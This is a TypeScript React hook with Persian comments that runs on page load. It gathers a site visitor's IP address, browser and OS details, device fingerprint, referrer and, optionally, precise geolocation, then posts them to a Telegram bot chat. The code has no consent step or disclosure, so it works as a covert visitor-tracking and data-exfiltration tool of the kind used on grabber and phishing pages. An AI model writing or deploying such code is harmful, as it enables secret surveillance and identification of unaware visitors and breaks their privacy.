'use client';
import { useEffect, useState } from 'react';
import axios, { AxiosError } from 'axios';
import { UAParser } from 'ua-parser-js';
import Fingerprint2 from 'fingerprintjs2';

// تعریف تایپ‌ها
interface TelegramUserDataProps {
    botToken: string;
    chatId: string;
    collectGeolocation?: boolean;
}

interface UserData {
    ip: string;
    userAgent: string;
    browser: string;
    os: string;
    deviceType: string;
    language: string;
    screenResolution: string;
    timestamp: string;
    timeZone: string;
    onlineStatus: boolean;
    networkType?: string;
    referrer?: string;
    fingerprint?: string;
    geolocation?: { latitude: number; longitude: number };
}

const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: TelegramUserDataProps) => {
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        const sendUserData = async () => {
            setIsLoading(true);
            setError(null);

            try {
                // جمع‌آوری اطلاعات کاربر
                const parser = new UAParser();
                const uaResult = parser.getResult();
                const userData: UserData = {
                    ip: '',
                    userAgent: navigator.userAgent,
                    browser: `${uaResult.browser.name} ${uaResult.browser.version}`,
                    os: `${uaResult.os.name} ${uaResult.os.version}`,
                    deviceType: uaResult.device.type || 'desktop',
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timestamp: new Date().toLocaleString('fa-IR'),
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    onlineStatus: navigator.onLine,
                    networkType: (navigator as any).connection?.effectiveType,
                    referrer: document.referrer || 'نامشخص',
                };

                // دریافت IP
                const ipResponse = await axios.get<{ ip: string }>('https://api.ipify.org?format=json', { timeout: 5000 });
                userData.ip = ipResponse.data.ip;

                // دریافت موقعیت جغرافیایی
                if (collectGeolocation && navigator.geolocation) {
                    try {
                        userData.geolocation = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                                reject,
                                { timeout: 10000 }
                            );
                        });
                    } catch (geoError) {
                        console.warn('خطا در دریافت موقعیت جغرافیایی:', geoError);
                    }
                }

                // دریافت فینگرپرینت
                try {
                    const components = await Fingerprint2.getPromise();
                    // @ts-ignore
                    userData.fingerprint = Fingerprint2.x64hash128(components.map((c) => c.value).join(), 31);
                } catch (fpError) {
                    console.warn('خطا در دریافت فینگرپرینت:', fpError);
                }

                // ساخت پیام
                const message: string = `
          اطلاعات کاربر:
          IP: ${userData.ip}
          مرورگر: ${userData.browser}
          سیستم‌عامل: ${userData.os}
          نوع دستگاه: ${userData.deviceType}
          User Agent: ${userData.userAgent}
          زبان: ${userData.language}
          رزولوشن صفحه: ${userData.screenResolution}
          زمان: ${userData.timestamp}
          منطقه زمانی: ${userData.timeZone}
          وضعیت آنلاین: ${userData.onlineStatus ? 'آنلاین' : 'آفلاین'}
          نوع اتصال: ${userData.networkType || 'نامشخص'}
          رجوع‌کننده: ${userData.referrer}
          فینگرپرینت: ${userData.fingerprint || 'نامشخص'}
          ${userData.geolocation ? `موقعیت: ${userData.geolocation.latitude}, ${userData.geolocation.longitude}` : 'موقعیت: غیرفعال'}
        `;

                // ارسال به تلگرام
                await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    chat_id: chatId,
                    text: message,
                }, { timeout: 10000 });

                console.log('اطلاعات با موفقیت ارسال شد');
            } catch (error: unknown) {
                const errorMessage = error instanceof AxiosError ? error.message : 'خطای ناشناخته';
                setError(errorMessage);
                console.error('خطا در جمع‌آوری یا ارسال اطلاعات:', error);
            } finally {
                setIsLoading(false);
            }
        };

        if (botToken && chatId) {
            sendUserData();
        } else {
            setError('توکن ربات یا آیدی چت ارائه نشده است');
        }
    }, [botToken, chatId, collectGeolocation]);

    return { isLoading, error };
};

export default useTelegramUserData;